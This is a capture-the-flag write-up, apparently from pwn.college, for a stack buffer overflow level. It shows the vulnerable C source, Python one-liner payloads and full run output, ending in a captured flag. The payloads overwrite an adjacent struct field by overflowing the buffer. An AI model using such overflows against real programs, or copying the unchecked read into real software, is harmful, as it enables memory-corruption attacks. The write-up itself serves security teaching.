## Challenge

So far, your buffer overflows have simply set variables to non-zero values. Of course, memory errors often enable significantly more advanced controls over a program's state. In this challenge, you must overflow the buffer precisely to set a win condition variable to a specific value. Some things to keep in mind:

- You will need to write binary data. This can't be printed on the keyboard; we recommend that you use something like Python to produce these bytes.
- Keep endianness in mind!
- Depending on how you generate the input data, you might accidentally terminate it with a newline! For example, bash's echo will newline-terminate by default (this behavior can be disabled using the -n flag). These newlines can cause problems --- if you are relying on precise control of program variables (which you are, in this module), an errant newline can unexpectedly corrupt program state and break your exploit. If you have doubts about whether your input has an errant newline, save it to a file and look at it using a hex dumper such as hd.

## Solution

I started by examining the source code

```bash
hacker@binary-exploitation~variable-control-easy:~$ cd /challenge
hacker@binary-exploitation~variable-control-easy:/challenge$ ls -la
total 48
drwxr-xr-x 1 root root  4096 Oct 21 12:39 .
drwxr-xr-x 1 root root  4096 Oct 21 12:39 ..
-rwsr-xr-x 1 root root  1058 Jan 27  2025 DESCRIPTION.md
-rwsr-xr-x 1 root root 25744 Jan 27  2025 binary-exploitation-var-control-w
-rwsr-xr-x 1 root root  7483 Jan 27  2025 binary-exploitation-var-control-w.c
hacker@binary-exploitation~variable-control-easy:/challenge$ cat binary-exploitation-var-control-w.c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

uint64_t sp_;
uint64_t bp_;
uint64_t sz_;
uint64_t cp_;
uint64_t cv_;
uint64_t si_;
uint64_t rp_;

#define GET_SP(sp) asm volatile ("mov %0, rsp" : "=r"(sp) : : );
#define GET_BP(bp) asm volatile ("mov %0, rbp" : "=r"(bp) : : );
#define GET_CANARY(cn) asm volatile ("mov %0, QWORD PTR [fs:0x28]" : "=r"(cn) : : );
#define GET_FRAME_WORDS(sz_, sp, bp, rp_) GET_SP(sp); GET_BP(bp); sz_ = (bp-sp)/8+2; rp_ = bp+8;
#define FIND_CANARY(cnp, cv, start)                                     \
  {                                                                     \
    cnp = start;                                                        \
    GET_CANARY(cv);                                                     \
    while (*(uint64_t *)cnp != cv) cnp = (uint64_t)cnp - 8;   \
  }

void DUMP_STACK(uint64_t sp, uint64_t n)
{
    printf("+---------------------------------+-------------------------+--------------------+\n");
    printf("| %31s | %23s | %18s |\n", "Stack location", "Data (bytes)", "Data (LE int)");
    printf("+---------------------------------+-------------------------+--------------------+\n");
    for (si_ = 0; si_ < n; si_++)
    {
        printf("| 0x%016lx (rsp+0x%04x) | %02x %02x %02x %02x %02x %02x %02x %02x | 0x%016lx |\n",
               sp+8*si_, 8*si_,
               *(uint8_t *)(sp+8*si_+0), *(uint8_t *)(sp+8*si_+1), *(uint8_t *)(sp+8*si_+2), *(uint8_t *)(sp+8*si_+3),
               *(uint8_t *)(sp+8*si_+4), *(uint8_t *)(sp+8*si_+5), *(uint8_t *)(sp+8*si_+6), *(uint8_t *)(sp+8*si_+7),
               *(uint64_t *)(sp+8*si_)
              );
    }
    printf("+---------------------------------+-------------------------+--------------------+\n");
}

void bin_padding()
{
    asm volatile (".rept 2483; nop; .endr");
}

void win()
{
    static char flag[256];
    static int flag_fd;
    static int flag_length;

    puts("You win! Here is your flag:");
    flag_fd = open("/flag", 0);
    if (flag_fd < 0)
    {
        printf("\n  ERROR: Failed to open the flag -- %s!\n", strerror(errno));
        if (geteuid() != 0)
        {
            printf("  Your effective user id is not 0!\n");
            printf("  You must directly run the suid binary in order to have the correct permissions!\n");
        }
        exit(-1);
    }
    flag_length = read(flag_fd, flag, sizeof(flag));
    if (flag_length <= 0)
    {
        printf("\n  ERROR: Failed to read the flag -- %s!\n", strerror(errno));
        exit(-1);
    }
    write(1, flag, flag_length);
    printf("\n\n");
}

int challenge(int argc, char **argv, char **envp)
{
    struct
    {
        char input[82];
        int win_variable;
        int lose_variable;
    } data  = {0} ;

    unsigned long size = 0;

    puts("The challenge() function has just been launched!");

    GET_FRAME_WORDS(sz_, sp_, bp_, rp_);
    puts("Before we do anything, let's take a look at challenge()'s stack frame:");
    DUMP_STACK(sp_, sz_);
    printf("Our stack pointer points to %p, and our base pointer points to %p.\n", sp_, bp_);
    printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
    printf("including the saved base pointer and the saved return address, for a\n");
    printf("total of %d bytes.\n", sz_ * 8);
    printf("The input buffer begins at %p, partway through the stack frame,\n", &data.input);
    printf("(\"above\" it in the stack are other local variables used by the function).\n");
    printf("Your input will be read into this buffer.\n");
    printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 82);
    printf("large input length, and thus overflow the buffer.\n\n");

    printf("In this level, there is a \"win\" variable.\n");
    printf("By default, the value of this variable is zero.\n");
    printf("However, if you can set variable to 0x5a79eb23, the flag will be printed.\n");
    printf("You can change this variable by overflowing the input buffer, but keep endianness in mind!\n");
    printf("The \"win\" variable is stored at %p, %d bytes after the start of your input buffer.\n\n", &data.win_variable, ((unsigned long) &data.win_variable) - ((unsigned long) &data.input));

    puts(" But be careful! There is also a LOSE variable. If this variable ends up non-zero, the program will terminate and you");
    puts("will not get the flag. Be careful not to overwrite this variable.\n");
    printf("The \"lose\" variable is stored at %p, %d bytes after the start of your input buffer.\n\n", &data.lose_variable, ((unsigned long) &data.lose_variable) - ((unsigned long) &data.input));

    puts("We have disabled the following standard memory corruption mitigations for this challenge:");
    puts("- the binary is *not* position independent. This means that it will be");
    puts("located at the same spot every time it is run, which means that by");
    puts("analyzing the binary (using objdump or reading this output), you can");
    puts("know the exact value that you need to overwrite the return address with.\n");

    FIND_CANARY(cp_, cv_, bp_);

    size = 4096;

    printf("You have chosen to send %lu bytes of input!\n", size);
    printf("This will allow you to write from %p (the start of the input buffer)\n", &data.input);
    printf("right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n", size + (unsigned long) &data.input, size - 82);

    printf("Send your payload (up to %lu bytes)!\n", size);
    int received = read(0, &data.input, (unsigned long) size);

    if (received < 0)
    {
        printf("ERROR: Failed to read input -- %s!\n", strerror(errno));
        exit(1);
    }

    printf("You sent %d bytes!\n", received);

    printf("Let's see what happened with the stack:\n\n");
    DUMP_STACK(sp_, sz_);

    printf("The program's memory status:\n");
    printf("- the input buffer starts at %p\n", &data.input);
    printf("- the saved frame pointer (of main) is at %p\n", bp_);
    printf("- the saved return address (previously to main) is at %p\n", rp_);
    printf("- the saved return address is now pointing to %p.\n", *(unsigned long*)(rp_));
    printf("- the canary is stored at %p.\n", cp_);
    printf("- the canary value is now %p.\n", *(unsigned long*)(cp_));
    printf("- the address of the win variable is %p.\n", &data.win_variable);
    printf("- the value of the win variable is 0x%x.\n", data.win_variable);
    printf("- the address of the lose variable is %p.\n", &data.lose_variable);
    printf("- the value of the lose variable is 0x%x.\n", data.lose_variable);
    printf("\n");

    if (data.lose_variable)
    {
        puts("Lose variable is set! Quitting!");
        exit(1);
    }
    if (data.win_variable == 1517939491)
    {
        win();
    }

    puts("Goodbye!");

    return 0;
}

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    char crash_resistance[0x1000];

    challenge(argc, argv, envp);

}
```

On analyzing the code, I found out that buffer is 82 bytes (`char input[82]`) and the program reads up to 4096 bytes (way more than buffer can hold). `win_variable` comes right after the buffer and `lose_variable` comes after `win_variable`

The win conditions are `win_variable` must equal 0x5a79eb23 (1517939491 in decimal) and `lose_variable` must remain 0

Before crafting the exploit, I needed to understand endianness. x86-64 systems use little-endian byte order, meaning the least significant byte comes first in memory.
To write `0x5a79eb23`,
- Big-endian (human readable): `\x5a\x79\xeb\x23`
- Little-endian (x86-64): `\x23\xeb\x79\x5a`

So for the payload, I need to send 82 bytes to fill the buffer and then 4 bytes for `win_variable` = `0x5a79eb23`

```bash
hacker@binary-exploitation~variable-control-easy:/challenge$ python3 -c "import sys; sys.stdout.buffer.write(b'A' * 82 + b'\x23\xeb\x79\x5a')"|./binary-exploitation-var-control-w
The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffc5c0da200 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007ffc5c0da208 (rsp+0x0008) | e8 b3 0d 5c fc 7f 00 00 | 0x00007ffc5c0db3e8 |
| 0x00007ffc5c0da210 (rsp+0x0010) | d8 b3 0d 5c fc 7f 00 00 | 0x00007ffc5c0db3d8 |
| 0x00007ffc5c0da218 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007ffc5c0da220 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc5c0da228 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc5c0da230 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc5c0da238 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc5c0da240 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc5c0da248 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc5c0da250 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc5c0da258 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc5c0da260 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc5c0da268 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc5c0da270 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc5c0da278 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc5c0da280 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc5c0da288 (rsp+0x0088) | 00 00 00 00 fc 7f 00 00 | 0x00007ffc00000000 |
| 0x00007ffc5c0da290 (rsp+0x0090) | b0 11 40 00 00 00 00 00 | 0x00000000004011b0 |
| 0x00007ffc5c0da298 (rsp+0x0098) | 00 7d a6 1a f8 76 98 ee | 0xee9876f81aa67d00 |
| 0x00007ffc5c0da2a0 (rsp+0x00a0) | e0 b2 0d 5c fc 7f 00 00 | 0x00007ffc5c0db2e0 |
| 0x00007ffc5c0da2a8 (rsp+0x00a8) | ff 24 40 00 00 00 00 00 | 0x00000000004024ff |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffc5c0da200, and our base pointer points to 0x7ffc5c0da2a0.
This means that we have (decimal) 22 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 176 bytes.
The input buffer begins at 0x7ffc5c0da230, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 82 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is a "win" variable.
By default, the value of this variable is zero.
However, if you can set variable to 0x5a79eb23, the flag will be printed.
You can change this variable by overflowing the input buffer, but keep endianness in mind!
The "win" variable is stored at 0x7ffc5c0da284, 84 bytes after the start of your input buffer.

 But be careful! There is also a LOSE variable. If this variable ends up non-zero, the program will terminate and you
will not get the flag. Be careful not to overwrite this variable.

The "lose" variable is stored at 0x7ffc5c0da288, 88 bytes after the start of your input buffer.

We have disabled the following standard memory corruption mitigations for this challenge:
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

You have chosen to send 4096 bytes of input!
This will allow you to write from 0x7ffc5c0da230 (the start of the input buffer)
right up to (but not including) 0x7ffc5c0db230 (which is 4014 bytes beyond the end of the buffer).
Send your payload (up to 4096 bytes)!
You sent 86 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffc5c0da200 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007ffc5c0da208 (rsp+0x0008) | e8 b3 0d 5c fc 7f 00 00 | 0x00007ffc5c0db3e8 |
| 0x00007ffc5c0da210 (rsp+0x0010) | d8 b3 0d 5c fc 7f 00 00 | 0x00007ffc5c0db3d8 |
| 0x00007ffc5c0da218 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007ffc5c0da220 (rsp+0x0020) | 00 00 00 00 56 00 00 00 | 0x0000005600000000 |
| 0x00007ffc5c0da228 (rsp+0x0028) | 00 10 00 00 00 00 00 00 | 0x0000000000001000 |
| 0x00007ffc5c0da230 (rsp+0x0030) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc5c0da238 (rsp+0x0038) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc5c0da240 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc5c0da248 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc5c0da250 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc5c0da258 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc5c0da260 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc5c0da268 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc5c0da270 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc5c0da278 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffc5c0da280 (rsp+0x0080) | 41 41 23 eb 79 5a 00 00 | 0x00005a79eb234141 |
| 0x00007ffc5c0da288 (rsp+0x0088) | 00 00 00 00 fc 7f 00 00 | 0x00007ffc00000000 |
| 0x00007ffc5c0da290 (rsp+0x0090) | b0 11 40 00 00 00 00 00 | 0x00000000004011b0 |
| 0x00007ffc5c0da298 (rsp+0x0098) | 00 7d a6 1a f8 76 98 ee | 0xee9876f81aa67d00 |
| 0x00007ffc5c0da2a0 (rsp+0x00a0) | e0 b2 0d 5c fc 7f 00 00 | 0x00007ffc5c0db2e0 |
| 0x00007ffc5c0da2a8 (rsp+0x00a8) | ff 24 40 00 00 00 00 00 | 0x00000000004024ff |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7ffc5c0da230
- the saved frame pointer (of main) is at 0x7ffc5c0da2a0
- the saved return address (previously to main) is at 0x7ffc5c0da2a8
- the saved return address is now pointing to 0x4024ff.
- the canary is stored at 0x7ffc5c0da298.
- the canary value is now 0xee9876f81aa67d00.
- the address of the win variable is 0x7ffc5c0da284.
- the value of the win variable is 0x5a79.
- the address of the lose variable is 0x7ffc5c0da288.
- the value of the lose variable is 0x0.

Goodbye!
```
From the output I understood that I only partially overwrote the win variable value which is only `0x5a79` but we need `0x5a79eb23`. I saw `The "win" variable is stored at 0x7ffc5c0da284, 84 bytes after the start of your input buffer.` even though the source code shows `char input[82];
`. That's when I came to know that the compiler adds 2 bytes of padding for alignment. This is common in C structures where the compiler aligns data to word boundaries for performance

So, I adjusted the payload to 84 bytes

```bash
hacker@binary-exploitation~variable-control-easy:/challenge$ python3 -c "import sys; sys.stdout.buffer.write(b'A' * 84 + b'\x23\xeb\x79\x5a')" |./binary-exploitation-var-control-w
The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007fff2858bee0 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007fff2858bee8 (rsp+0x0008) | c8 d0 58 28 ff 7f 00 00 | 0x00007fff2858d0c8 |
| 0x00007fff2858bef0 (rsp+0x0010) | b8 d0 58 28 ff 7f 00 00 | 0x00007fff2858d0b8 |
| 0x00007fff2858bef8 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007fff2858bf00 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff2858bf08 (rsp+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff2858bf10 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff2858bf18 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff2858bf20 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff2858bf28 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff2858bf30 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff2858bf38 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff2858bf40 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff2858bf48 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff2858bf50 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff2858bf58 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff2858bf60 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff2858bf68 (rsp+0x0088) | 00 00 00 00 ff 7f 00 00 | 0x00007fff00000000 |
| 0x00007fff2858bf70 (rsp+0x0090) | b0 11 40 00 00 00 00 00 | 0x00000000004011b0 |
| 0x00007fff2858bf78 (rsp+0x0098) | 00 84 31 2f 05 44 8c 48 | 0x488c44052f318400 |
| 0x00007fff2858bf80 (rsp+0x00a0) | c0 cf 58 28 ff 7f 00 00 | 0x00007fff2858cfc0 |
| 0x00007fff2858bf88 (rsp+0x00a8) | ff 24 40 00 00 00 00 00 | 0x00000000004024ff |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7fff2858bee0, and our base pointer points to 0x7fff2858bf80.
This means that we have (decimal) 22 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 176 bytes.
The input buffer begins at 0x7fff2858bf10, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 82 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is a "win" variable.
By default, the value of this variable is zero.
However, if you can set variable to 0x5a79eb23, the flag will be printed.
You can change this variable by overflowing the input buffer, but keep endianness in mind!
The "win" variable is stored at 0x7fff2858bf64, 84 bytes after the start of your input buffer.

 But be careful! There is also a LOSE variable. If this variable ends up non-zero, the program will terminate and you
will not get the flag. Be careful not to overwrite this variable.

The "lose" variable is stored at 0x7fff2858bf68, 88 bytes after the start of your input buffer.

We have disabled the following standard memory corruption mitigations for this challenge:
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

You have chosen to send 4096 bytes of input!
This will allow you to write from 0x7fff2858bf10 (the start of the input buffer)
right up to (but not including) 0x7fff2858cf10 (which is 4014 bytes beyond the end of the buffer).
Send your payload (up to 4096 bytes)!
You sent 88 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007fff2858bee0 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007fff2858bee8 (rsp+0x0008) | c8 d0 58 28 ff 7f 00 00 | 0x00007fff2858d0c8 |
| 0x00007fff2858bef0 (rsp+0x0010) | b8 d0 58 28 ff 7f 00 00 | 0x00007fff2858d0b8 |
| 0x00007fff2858bef8 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007fff2858bf00 (rsp+0x0020) | 00 00 00 00 58 00 00 00 | 0x0000005800000000 |
| 0x00007fff2858bf08 (rsp+0x0028) | 00 10 00 00 00 00 00 00 | 0x0000000000001000 |
| 0x00007fff2858bf10 (rsp+0x0030) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff2858bf18 (rsp+0x0038) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff2858bf20 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff2858bf28 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff2858bf30 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff2858bf38 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff2858bf40 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff2858bf48 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff2858bf50 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff2858bf58 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff2858bf60 (rsp+0x0080) | 41 41 41 41 23 eb 79 5a | 0x5a79eb2341414141 |
| 0x00007fff2858bf68 (rsp+0x0088) | 00 00 00 00 ff 7f 00 00 | 0x00007fff00000000 |
| 0x00007fff2858bf70 (rsp+0x0090) | b0 11 40 00 00 00 00 00 | 0x00000000004011b0 |
| 0x00007fff2858bf78 (rsp+0x0098) | 00 84 31 2f 05 44 8c 48 | 0x488c44052f318400 |
| 0x00007fff2858bf80 (rsp+0x00a0) | c0 cf 58 28 ff 7f 00 00 | 0x00007fff2858cfc0 |
| 0x00007fff2858bf88 (rsp+0x00a8) | ff 24 40 00 00 00 00 00 | 0x00000000004024ff |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7fff2858bf10
- the saved frame pointer (of main) is at 0x7fff2858bf80
- the saved return address (previously to main) is at 0x7fff2858bf88
- the saved return address is now pointing to 0x4024ff.
- the canary is stored at 0x7fff2858bf78.
- the canary value is now 0x488c44052f318400.
- the address of the win variable is 0x7fff2858bf64.
- the value of the win variable is 0x5a79eb23.
- the address of the lose variable is 0x7fff2858bf68.
- the value of the lose variable is 0x0.

You win! Here is your flag:
pwn.college{4naNeBKidn09tQBtp9wjsrQf5ee.ddTNzMDLyMjN0czW}


Goodbye!
```
